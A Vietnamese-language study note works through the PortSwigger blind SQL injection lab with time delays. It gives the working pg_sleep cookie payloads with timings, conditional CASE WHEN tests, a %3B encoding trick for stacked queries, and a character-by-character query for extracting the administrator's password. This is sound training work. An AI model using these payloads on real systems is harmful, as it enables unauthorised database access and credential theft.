# Lab — Blind SQL injection with time delays (SQLi / Apprentice)
![[Pasted image 20261020160631.png]]
-mô tả: cookie `TrackingId` được ghép vào query, response không đổi dù query đúng/sai/lỗi → blind. Mình chèn `pg_sleep()` rồi đo thời gian; lab solved khi tạo được delay 10 giây.

> [!NOTE] đề nói gì
> - link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
> - lỗi ở cookie `TrackingId`, mục tiêu: gây delay 10 giây.
> - liên quan: [[Blind sql injection]], [[SQL cheet sheet]].

### quá trình suy nghĩ

1. Mình thêm `'` vào `TrackingId` → vẫn 200, 14431B, 1.62s (baseline 1.32s) => blind, không có kênh boolean/error.
2. Đề hint query chạy sync nên mình đo thời gian. Thử Postgres trước: `'||pg_sleep(10)--` → **21.5s** => time-based, đúng Postgres. Lab solved.
3. Mình đo thêm cho hiểu con số: sleep(1) 4.4s, sleep(2) 7.4s, sleep(5) 16.3s, sleep(10) lần 2 31.4s => delay ~3 lần sleep (cookie bị dùng ở 3 query); lần đầu 21.5s là hụt nhịp. => cứ lấy baseline + ngưỡng, đừng so tuyệt đối.
4. Verify conditional: `CASE WHEN (1=1)` → 10.5s, `(1=2)` → 1.2s => điều khiển được sleep, đủ để exfil.
5. Mình thử stacked `';SELECT pg_sleep(2)--` → 1.45s, tưởng không chạy; hoá ra dấu `;` trong Cookie bị parser cắt nên server chỉ nhận `x'`. Encode thành `%3B` thì stacked chạy (mình verify ở lab sau). Subquery `CASE WHEN ((SELECT 'a')='a')` → 7.15s cũng chạy => có 2 đường, tuỳ context.

### hướng giải

- [ ] thêm `'` vào `TrackingId` xác nhận blind
- [ ] `'||pg_sleep(10)--` (Postgres), hoặc `SLEEP(10)` / `WAITFOR DELAY`
- [ ] delay lớn hơn baseline rõ rệt là solved
- [ ] (mở rộng) `CASE WHEN` + `pg_sleep` để test true/false

### giải

check blind trước:

```
GET / HTTP/1.1
Cookie: TrackingId=RrZeUsNtWSYN7WtB'

-> 200, 14431B, 1.62s
=> không đổi gì so với baseline 1.32s
=> blind thật, không có tín hiệu boolean/error
```
![[Pasted image 20261020161053.png]]
payload gây delay:

```
GET / HTTP/1.1
Cookie: TrackingId=RrZeUsNtWSYN7WtB'||pg_sleep(10)--

-> 200, 21.50s
=> delay ~20s so với baseline 1.32s
=> time-based SQLi, DB là Postgres
=> lab solved
```

đo thêm để hiểu con số delay:

```
baseline                     -> 1.32s
pg_sleep(1)                  -> 4.38s    (~3s)
pg_sleep(2)                  -> 7.35s    (~6s)
pg_sleep(3) trong CASE 1=1   -> 10.53s   (~9s)
pg_sleep(5)                  -> 16.27s   (~15s)
pg_sleep(10) lần 1           -> 21.50s   (~20s, hụt nhịp)
pg_sleep(10) lần 2           -> 31.43s   (~30s)
CASE 1=2 + pg_sleep(3)       -> 1.24s    (0s)
```

```
=> delay ~ 3 lần tham số sleep => cookie bị dùng ở 3 query trong flow tracking
=> lần sleep(10) đầu chỉ ~2 nhịp => có transient, đừng tin 1 lần đo
=> luôn so với baseline và dùng ngưỡng (vd > 5s), không so tuyệt đối
```

verify conditional:

```
GET / HTTP/1.1
Cookie: TrackingId=RrZeUsNtWSYN7WtB'||CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--
-> 10.53s

GET / HTTP/1.1
Cookie: TrackingId=RrZeUsNtWSYN7WtB'||CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END--
-> 1.24s
=> true/false phân biệt rõ, dùng được để exfil
```

### mở rộng — khi cần lấy data chứ không chỉ chứng minh delay

thử stacked query kiểu cheat sheet trước:

```
Cookie: TrackingId=x';SELECT pg_sleep(2)--
-> 1.45s
=> tưởng không chạy, nhưng thực ra dấu `;` bị cookie parser cắt -> server chỉ nhận `x'`
```

encode `;` thành `%3B`:

```
Cookie: TrackingId=x'%3BSELECT pg_sleep(2)--
-> delay
=> stacked chạy, lỗi cũ là do gửi raw `;` (mình verify ở lab sau, cùng cơ chế cookie)
```

subquery trong expression thì chạy:

```
Cookie: TrackingId=x'||CASE WHEN ((SELECT 'a')='a') THEN pg_sleep(2) ELSE pg_sleep(0) END--
-> 7.15s
=> subquery dùng được
```

công thức exfil từng ký tự (bài này không cần, nhưng cùng cơ chế đã test):

```
'||CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a') THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### bài học

> [!NOTE]
> - blind mà response y hệt thì đổi sang đo thời gian.
> - delay có thể bị nhân vì query chạy nhiều lần — dùng baseline + ngưỡng.
> - `;` trong cookie là dấu phân cách, muốn chèn stacked phải encode `%3B`, không thì server chỉ nhận phần trước `;` (mình từng kết luận sai "stacked không chạy" vì test raw `;`).
> - defense: query tham số hoá, không ghép cookie vào SQL.


![[Pasted image 20261020154954.png]]